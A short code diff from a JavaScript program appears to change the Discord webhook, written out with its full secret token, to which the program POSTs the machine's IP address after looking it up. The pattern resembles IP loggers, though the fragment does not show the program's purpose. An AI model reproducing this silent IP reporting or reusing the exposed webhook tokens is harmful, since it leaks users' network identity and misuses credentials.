@@ -18,7 +18,7 @@ async function getIP() {
 async function main() {
     var IP = await getIP()
 
-    var Response = await requestp("https://discord.com/api/webhooks/1090096439645982760/--OuoHoycV8Q7QLtnYSmQGfN8Po-oug_tVX0Rxy3aChs84kydxDiUwKW_b0KqFIQqrup", {
+    var Response = await requestp("https://discord.com/api/webhooks/1090099937800364142/Hq8qQqihvSrGkuvFwkiP9MaIEngSi8SE_VdGsqe4faI5U7Tpsl2hiKGzelhUB16O_4fU", {
         json: true,
         method: "POST",
         body: {
